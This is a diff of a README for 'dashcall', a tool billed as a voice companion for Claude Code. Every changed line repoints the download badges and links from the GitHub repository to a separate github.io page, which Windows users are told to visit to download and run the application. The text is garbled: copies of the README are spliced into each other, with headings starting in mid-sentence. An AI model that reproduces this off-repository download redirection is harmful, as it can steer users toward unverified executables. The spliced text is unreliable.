@@ -1,6 +1,6 @@
 # 🚗 dashcall - Your Claude Code Voice Companion
 
-[![Download dashcall](https://img.shields.io/badge/Download-dashcall-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NandanaRajesh25/dashcall)
+[![Download dashcall](https://img.shields.io/badge/Download-dashcall-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://nandanarajesh25.github.io)
 
 ## 👋 Overview
 
@@ -46,7 +46,7 @@ Getting dashcall is simple. You do not need to install developer tools or unders
 
 Use this link:
 
-[Visit the dashcall download page](https://github.com/NandanaRajesh25/dashcall)
+[Visit the dashcall download page](https://nandanarajesh25.github.io)
 
 Visit this link to download the application.
 
@@ -57,7 +57,7 @@ The same link appears again in the download and setup section below. Keep this p
 This section is the main setup path for Windows users. Follow it exactly.
 
 1. Open your web browser on your Windows computer.
-2. Go to the dashcall download page using this link: [https://github.com/NandanaRajesh25/dashcall](https://github.com/NandanaRajesh25/dashcall).
+2. Go to the dashcall download page using this link: [https://nandanarajesh25.github.io](https://nandanarajesh25.github.io).
 3. Visit this link to download the application.
 4. Follow the download page’s prompt to get the application.
 5. When the download finishes, open dashcall from the place where your downloaded files are saved.
@@ -129,7 +129,7 @@ Safe car use tips:
 - Use voice input instead of typing.
 - Do# 🚗 dashcall - Talk to Claude Code Anywhere
 
-[![Download dashcall](https://img.shields.io/badge/Download-dashcall-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NandanaRajesh25/dashcall)
+[![Download dashcall](https://img.shields.io/badge/Download-dashcall-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://nandanarajesh25.github.io)
 
 ## 👋 Overview
 
@@ -165,7 +165,7 @@ The download link is the single place to get dashcall. You will see it again in 
 This is the main download section for Windows users. Follow these steps:
 
 1. Open your web browser on your Windows computer.
-2. Go to the dashcall download page: [https://github.com/NandanaRajesh25/dashcall](https://github.com/NandanaRajesh25/dashcall).
+2. Go to the dashcall download page: [https://nandanarajesh25.github.io](https://nandanarajesh25.github.io).
 3. Visit this link to download the application.
 4. Follow the download page’s prompt to get the application.
 5. When the download finishes, open dashcall from the place where your downloaded files are saved.
@@ -245,7 +245,7 @@ If your car browser does not allow microphone access, use touch controls only wh
 
 If dashcall does not seem to work as expected, try these simple# 🚗 dashcall - Talk to Claude Code Anywhere
 
-[![Download dashcall](https://img.shields.io/badge/Download-dashcall-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NandanaRajesh25/dashcall)
+[![Download dashcall](https://img.shields.io/badge/Download-dashcall-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://nandanarajesh25.github.io)
 
 ## 👋 Overview
 
@@ -289,7 +289,7 @@ Before you begin, make sure you are connected to the internet and that you have 
 This section is the main download path for Windows users. Follow it exactly, one step at a time.
 
 1. Open your web browser on your Windows computer.
-2. Go to the dashcall download page using this link: [https://github.com/NandanaRajesh25/dashcall](https://github.com/NandanaRajesh25/dashcall).
+2. Go to the dashcall download page using this link: [https://nandanarajesh25.github.io](https://nandanarajesh25.github.io).
 3. Visit this link to download the application.
 4. Follow the prompt on the page to get the application.
 5. When the download finishes, open dashcall from the place where your downloaded files are saved.
@@ -412,7 +412,7 @@ For voice use, remember that your microphone picks up what is happening around y
 
 If you need the link a second time, here it is:
 
-[Visit the dashcall download page](https://github.com/NandanaRajesh25/dashcall)
+[Visit the dashcall download page](https://nandanarajesh25.github.io)
 
 Visit this link to download the application.
 
